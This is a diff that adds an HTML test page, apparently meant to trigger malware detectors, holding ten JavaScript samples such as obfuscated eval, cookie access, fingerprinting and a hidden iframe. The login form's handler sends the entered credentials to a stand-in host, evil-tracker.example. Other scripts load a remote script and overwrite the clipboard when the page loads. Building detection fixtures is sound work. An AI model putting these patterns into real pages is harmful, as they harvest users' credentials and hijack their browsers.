@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Suspicious JavaScript Test Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .warning {
+            background-color: #ffe6e6;
+            border-left: 4px solid #ff0000;
+            padding: 10px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #333;
+        }
+        h2 {
+            color: #555;
+            margin-top: 30px;
+        }
+        code {
+            background-color: #f5f5f5;
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <strong>Warning:</strong> This page contains deliberately suspicious JavaScript patterns for testing purposes.
+        None of this code is actually harmful, but it's designed to trigger malware detection systems.
+    </div>
+
+    <h1>Suspicious JavaScript Test Page</h1>
+    <p>This page contains various JavaScript patterns that should trigger detection systems.</p>
+
+    <!-- Test 1: Obfuscated JavaScript -->
+    <h2>1. Obfuscated JavaScript</h2>
+    <script>
+        eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('4 3(){2.1("0 5 6 7 8!")}3();',9,9,'This|log|console|testFunction|function|is|an|obfuscated|script'.split('|'),0,{}));
+    </script>
+
+    <!-- Test 2: Base64 encoded JavaScript -->
+    <h2>2. Base64 Encoded JavaScript</h2>
+    <script>
+        // Decode and execute Base64 JavaScript
+        eval(atob("ZnVuY3Rpb24gc3VzcGljaW91c0Z1bmN0aW9uKCkgeyBjb25zb2xlLmxvZygiVGhpcyBpcyBkZWNvZGVkIGZyb20gQmFzZTY0IGVuY29kaW5nISIpOyB9CnN1c3BpY2lvdXNGdW5jdGlvbigpOw=="));
+    </script>
+
+    <!-- Test 3: Fake cookie stealer -->
+    <h2>3. Simulated Cookie Access</h2>
+    <script>
+        // Simulate cookie access (not actually sending anywhere)
+        const stolenCookies = document.cookie;
+        console.log("Accessed cookies:", stolenCookies);
+        
+        // Create a fake payload that looks like it's sending data
+        const fakePayload = {
+            cookies: stolenCookies,
+            url: window.location.href,
+            userAgent: navigator.userAgent
+        };
+        
+        // Simulate sending to a suspicious endpoint (not actually sending)
+        console.log("Would send to malicious endpoint:", fakePayload);
+    </script>
+
+    <!-- Test 4: Suspicious DOM manipulation -->
+    <h2>4. Suspicious DOM Manipulation</h2>
+    <form id="login-form">
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button type="submit">Login</button>
+    </form>
+    <script>
+        // Hook form submission
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Log credentials (simulating credential harvesting)
+            console.log("Captured credentials:", username, password);
+            
+            // Create a fake image for data exfiltration simulation
+            const trackerImg = new Image();
+            trackerImg.src = "https://evil-tracker.example/collect?u=" + encodeURIComponent(username) + "&p=" + encodeURIComponent(password);
+        });
+    </script>
+
+    <!-- Test 5: Fake cryptomining code -->
+    <h2>5. Cryptocurrency Mining Simulation</h2>
+    <script>
+        // This doesn't actually mine anything, just looks suspicious
+        function simulateMining() {
+            console.log("Starting simulated mining...");
+            
+            // Suspicious WebWorker creation pattern
+            try {
+                const minerCode = `
+                    self.onmessage = function(e) {
+                        // Simulate intensive calculation
+                        let hashResult = 0;
+                        for (let i = 0; i < 1000000; i++) {
+                            hashResult += Math.sqrt(i * 1337);
+                        }
+                        self.postMessage({hashRate: Math.random() * 50, hash: hashResult.toString(16)});
+                    };
+                `;
+                
+                const blob = new Blob([minerCode], {type: 'application/javascript'});
+                const worker = new Worker(URL.createObjectURL(blob));
+                
+                worker.onmessage = function(e) {
+                    console.log("Mining stats:", e.data);
+                };
+                
+                worker.postMessage({command: 'start'});
+            } catch(e) {
+                console.log("Mining simulation failed:", e);
+            }
+        }
+        
+        // Simulate delayed start to evade detection
+        setTimeout(simulateMining, 2000);
+    </script>
+
+    <!-- Test 6: Suspicious iframe loading -->
+    <h2>6. Hidden iframe technique</h2>
+    <script>
+        // Create a hidden iframe (common in attacks)
+        const hiddenFrame = document.createElement('iframe');
+        hiddenFrame.style.position = 'absolute';
+        hiddenFrame.style.opacity = '0.01';
+        hiddenFrame.style.height = '1px';
+        hiddenFrame.style.width = '1px';
+        hiddenFrame.src = 'about:blank';
+        document.body.appendChild(hiddenFrame);
+        
+        // Try to inject content into the iframe
+        setTimeout(function() {
+            try {
+                const iframeDoc = hiddenFrame.contentDocument || hiddenFrame.contentWindow.document;
+                iframeDoc.body.innerHTML = '<form id="fake-form" action="https://malicious-site.example/collect" method="POST"><input type="hidden" name="data" value="test"></form>';
+                console.log("Hidden iframe content injected");
+            } catch(e) {
+                console.log("Iframe injection failed:", e);
+            }
+        }, 1000);
+    </script>
+
+    <!-- Test 7: Suspicious third-party script loading -->
+    <h2>7. Dynamic Script Loading</h2>
+    <script>
+        // Dynamically load a script (common in attacks)
+        function loadMaliciousScript() {
+            const script = document.createElement('script');
+            script.type = 'text/javascript';
+            // This URL doesn't exist but looks suspicious
+            script.src = 'https://cdn.evil-scripts.example/tracker.js?id=' + Math.random();
+            document.head.appendChild(script);
+            console.log("Attempted to load suspicious external script");
+        }
+        
+        // Delayed loading attempt
+        setTimeout(loadMaliciousScript, 1500);
+    </script>
+
+    <!-- Test 8: Browser fingerprinting techniques -->
+    <h2>8. Browser Fingerprinting</h2>
+    <script>
+        // Collect browser fingerprinting data
+        const fingerprint = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screenResolution: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            plugins: Array.from(navigator.plugins).map(p => p.name),
+            canvas: (function() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = "top";
+                    ctx.font = "14px 'Arial'";
+                    ctx.fillStyle = "#f60";
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = "#069";
+                    ctx.fillText("Fingerprint", 2, 15);
+                    return canvas.toDataURL().substr(-50);
+                } catch(e) {
+                    return "Canvas fingerprinting failed";
+                }
+            })()
+        };
+        
+        console.log("Fingerprint data collected:", fingerprint);
+        
+        // Simulate sending fingerprint to tracking server
+        const fingerprintData = JSON.stringify(fingerprint);
+        console.log("Would send fingerprint:", fingerprintData.substr(0, 100) + "...");
+    </script>
+
+    <!-- Test 9: Eval with encoded content -->
+    <h2>9. Eval with Encoded Content</h2>
+    <script>
+        // Using eval with encoded content (very suspicious pattern)
+        const encodedPayload = "Y29uc29sZS5sb2coIlRoaXMgY29kZSB3YXMgZXhlY3V0ZWQgdGhyb3VnaCBldmFsIGZyb20gZW5jb2RlZCBjb250ZW50Iik7";
+        eval(window.atob(encodedPayload));
+    </script>
+
+    <!-- Test 10: Suspicious URL redirection -->
+    <h2>10. URL Redirection Code</h2>
+    <script>
+        // Code that looks like it's preparing for redirect
+        function simulateRedirect() {
+            console.log("Preparing to redirect...");
+            
+            // Create URL that looks suspicious
+            const redirectUrl = "https://legitimate-looking-site.example/login.php?redirect=" + 
+                                encodeURIComponent("https://malicious-site.example/fake-login?original=" + 
+                                window.location.href);
+            
+            console.log("Would redirect to:", redirectUrl);
+            
+            // Not actually redirecting, just logging
+            // window.location.href = redirectUrl;
+        }
+        
+        // Add a delayed execution
+        if (Math.random() > 0.9) {
+            // Low probability to simulate evasion
+            setTimeout(simulateRedirect, 3000);
+        }
+    </script>
+</body>
+<script>
+window.addEventListener('DOMContentLoaded', function() {
+    // Modern Clipboard API (most browsers)
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText('malicious clipboard content');
+    } else {
+        // Legacy method
+        var textarea = document.createElement('textarea');
+        textarea.value = 'malicious clipboard content';
+        document.body.appendChild(textarea);
+        textarea.select();
+        try {
+            document.execCommand('copy');
+        } catch (e) {}
+        document.body.removeChild(textarea);
+    }
+});
+</script>
+</html>
